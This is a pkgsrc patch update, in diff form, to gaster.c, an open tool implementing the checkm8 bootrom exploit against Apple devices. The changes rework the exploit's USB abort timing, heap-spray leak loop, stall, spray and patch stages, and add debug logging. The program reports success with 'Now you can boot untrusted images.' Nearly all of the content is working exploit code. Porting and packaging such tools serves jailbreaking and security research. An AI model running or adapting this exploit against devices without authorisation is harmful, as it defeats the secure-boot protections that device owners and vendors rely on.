@@ -1,6 +1,6 @@
 $NetBSD$
 diff --git gaster.c gaster.c
-index b52b08d..071ab77 100644
+index b52b08d..e8b8cb3 100644
 --- gaster.c
 +++ gaster.c
 @@ -1,4 +1,5 @@
@@ -88,7 +88,7 @@ index b52b08d..071ab77 100644
  	return completed != 0;
  }
  
-@@ -288,6 +333,365 @@ init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
+@@ -288,6 +333,366 @@ init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
  	handle->pid = pid;
  	handle->device = NULL;
  }
@@ -423,9 +423,10 @@ index b52b08d..071ab77 100644
 +	while(atomic_load_explicit(&ctx.started, memory_order_acquire) == 0) {
 +		sched_yield();
 +	}
++	/* Tight abort loop, no yield: scheduler pauses would move the
++	 * effective cancel point and make the primer depth random. */
 +	while(!atomic_load_explicit(&ctx.done, memory_order_acquire)) {
 +		ioctl(handle->fd, USB_ABORT_REQUEST);
-+		sched_yield();
 +	}
 +	pthread_join(thread, NULL);
 +
@@ -454,7 +455,7 @@ index b52b08d..071ab77 100644
  #else
  static void
  cf_dictionary_set_int16(CFMutableDictionaryRef dict, const void *key, uint16_t val) {
-@@ -501,18 +905,48 @@ get_usb_serial_number(usb_handle_t *handle) {
+@@ -501,18 +906,48 @@ get_usb_serial_number(usb_handle_t *handle) {
  	char *str = NULL;
  	size_t i, sz;
  
@@ -504,7 +505,7 @@ index b52b08d..071ab77 100644
  	bool ret = false;
  
  	if(usb_serial_num != NULL) {
-@@ -823,6 +1257,14 @@ dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state) {
+@@ -823,6 +1258,14 @@ dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state) {
  	} dfu_status;
  	transfer_ret_t transfer_ret;
  
@@ -519,7 +520,7 @@ index b52b08d..071ab77 100644
  	return send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(dfu_status) && dfu_status.status == status && dfu_status.state == state;
  }
  
-@@ -846,11 +1288,24 @@ checkm8_stage_reset(const usb_handle_t *handle) {
+@@ -846,11 +1289,24 @@ checkm8_stage_reset(const usb_handle_t *handle) {
  
  static bool
  checkm8_stage_setup(const usb_handle_t *handle) {
@@ -546,7 +547,7 @@ index b52b08d..071ab77 100644
  			return true;
  		}
  		send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
-@@ -862,8 +1317,10 @@ checkm8_stage_setup(const usb_handle_t *handle) {
+@@ -862,8 +1318,10 @@ checkm8_stage_setup(const usb_handle_t *handle) {
  static bool
  checkm8_usb_request_leak(const usb_handle_t *handle) {
  	transfer_ret_t transfer_ret;
@@ -558,7 +559,7 @@ index b52b08d..071ab77 100644
  }
  
  static void
-@@ -872,18 +1329,27 @@ checkm8_stall(const usb_handle_t *handle) {
+@@ -872,18 +1330,27 @@ checkm8_stall(const usb_handle_t *handle) {
  	transfer_ret_t transfer_ret;
  
  	for(;;) {
@@ -587,7 +588,7 @@ index b52b08d..071ab77 100644
  }
  
  static bool
-@@ -902,17 +1368,36 @@ checkm8_stage_spray(const usb_handle_t *handle) {
+@@ -902,17 +1369,36 @@ checkm8_stage_spray(const usb_handle_t *handle) {
  			while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
  		} else {
  			checkm8_stall(handle);
@@ -625,7 +626,7 @@ index b52b08d..071ab77 100644
  	}
  	return true;
  }
-@@ -1208,18 +1693,56 @@ checkm8_stage_patch(const usb_handle_t *handle) {
+@@ -1208,18 +1694,56 @@ checkm8_stage_patch(const usb_handle_t *handle) {
  				overwrite = &checkm8_overwrite_armv7;
  				overwrite_sz = sizeof(checkm8_overwrite_armv7);
  			}
@@ -686,7 +687,7 @@ index b52b08d..071ab77 100644
  				}
  			}
  			free(data);
-@@ -1228,20 +1751,202 @@ checkm8_stage_patch(const usb_handle_t *handle) {
+@@ -1228,20 +1752,211 @@ checkm8_stage_patch(const usb_handle_t *handle) {
  	return ret;
  }
  
@@ -769,25 +770,34 @@ index b52b08d..071ab77 100644
 +		fprintf(stderr, "[pwn2] initial stall: ret=%d errno=%d\n", (int)probe.ret, gaster_dbg_sync_errno);
 +#endif
 +	}
-+	for(i = 0; i < config_large_leak; ++i) {
-+		/* The reference relies on natural completion; its 1 ms
-+		 * timeout is only insurance.  A fixed host-side cancel at
-+		 * 1 ms lands mid-transfer as soon as the growing heap
-+		 * slows the ROM down, and that cancel kills the responsive
-+		 * state (probe battery 2026-10-23: without cancels every
-+		 * read completes).  Run the leaks synchronously with the
-+		 * generous phase timeout instead. */
-+		transfer_ret_t leak_ret;
++		size_t dead = 0;
 +
-+		send_usb_control_request_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x40, &leak_ret);
-+		if((i & 0x3FF) == 0) {
-+			struct timespec now;
-+			clock_gettime(CLOCK_MONOTONIC, &now);
-+			fprintf(stderr, "[pwn2] leak %zu/%zu ret=%d errno=%d t=%lld.%03ld\n",
-+			    i, config_large_leak, (int)leak_ret.ret, gaster_dbg_sync_errno,
-+			    (long long)(now.tv_sec), now.tv_nsec / 1000000);
++		for(i = 0; i < config_large_leak; ++i) {
++			/* The reference relies on natural completion; its 1 ms
++			 * timeout is only insurance.  A fixed host-side cancel at
++			 * 1 ms lands mid-transfer as soon as the growing heap
++			 * slows the ROM down, and that cancel kills the responsive
++			 * state (probe battery 2026-10-23: without cancels every
++			 * read completes).  Run the leaks synchronously with the
++			 * generous phase timeout instead. */
++			transfer_ret_t leak_ret;
++
++			send_usb_control_request_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x40, &leak_ret);
++			if(leak_ret.ret == USB_TRANSFER_OK) {
++				dead = 0;
++			} else if(++dead > 8) {
++				fprintf(stderr, "[pwn2] leak %zu/%zu: no reply for %zu reads, heap state lost\n",
++				    i, config_large_leak, dead);
++				return false;
++			}
++			if((i & 0x3FF) == 0) {
++				struct timespec now;
++				clock_gettime(CLOCK_MONOTONIC, &now);
++				fprintf(stderr, "[pwn2] leak %zu/%zu ret=%d errno=%d t=%lld.%03ld\n",
++				    i, config_large_leak, (int)leak_ret.ret, gaster_dbg_sync_errno,
++				    (long long)(now.tv_sec), now.tv_nsec / 1000000);
++			}
 +		}
-+	}
 +	{
 +		transfer_ret_t tail;
 +
@@ -896,7 +906,7 @@ index b52b08d..071ab77 100644
  			if(stage == STAGE_RESET) {
  				puts("Stage: RESET");
  				ret = checkm8_stage_reset(handle);
-@@ -1265,7 +1970,7 @@ gaster_checkm8(usb_handle_t *handle) {
+@@ -1265,7 +1980,7 @@ gaster_checkm8(usb_handle_t *handle) {
  				puts("ret: false");
  				stage = STAGE_RESET;
  			}
@@ -905,7 +915,7 @@ index b52b08d..071ab77 100644
  		} else {
  			stage = STAGE_PWNED;
  			puts("Now you can boot untrusted images.");
-@@ -1412,7 +2117,7 @@ img4_init(const uint8_t *src, size_t src_len, img4_t *img4) {
+@@ -1412,7 +2127,7 @@ img4_init(const uint8_t *src, size_t src_len, img4_t *img4) {
  
  static bool
  aes_256_cbc_decrypt(const uint8_t *key, const uint8_t *iv, const uint8_t *data_src, uint8_t *data_dst, size_t data_sz) {
@@ -914,7 +924,7 @@ index b52b08d..071ab77 100644
  	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  	bool ret = false;
  	int out_sz;
-@@ -1628,10 +2333,20 @@ main(int argc, char **argv) {
+@@ -1628,10 +2343,20 @@ main(int argc, char **argv) {
  	int ret = EXIT_FAILURE;
  	usb_handle_t handle;
  
@@ -935,7 +945,7 @@ index b52b08d..071ab77 100644
  	if(env_usb_abort_timeout_min == NULL || sscanf(env_usb_abort_timeout_min, "%u", &usb_abort_timeout_min) != 1 || usb_abort_timeout_min > usb_timeout) {
  		usb_abort_timeout_min = 0;
  	}
-@@ -1640,6 +2355,10 @@ main(int argc, char **argv) {
+@@ -1640,6 +2365,10 @@ main(int argc, char **argv) {
  		if(gaster_reset(&handle)) {
  			ret = 0;
  		}
@@ -946,7 +956,7 @@ index b52b08d..071ab77 100644
  	} else if(argc == 2 && strcmp(argv[1], "pwn") == 0) {
  		if(gaster_checkm8(&handle)) {
  			ret = 0;
-@@ -1657,6 +2376,10 @@ main(int argc, char **argv) {
+@@ -1657,6 +2386,10 @@ main(int argc, char **argv) {
  		puts("env:");
  		puts("USB_TIMEOUT - USB timeout in ms");
  		puts("USB_ABORT_TIMEOUT_MIN - USB abort timeout minimum in ms");
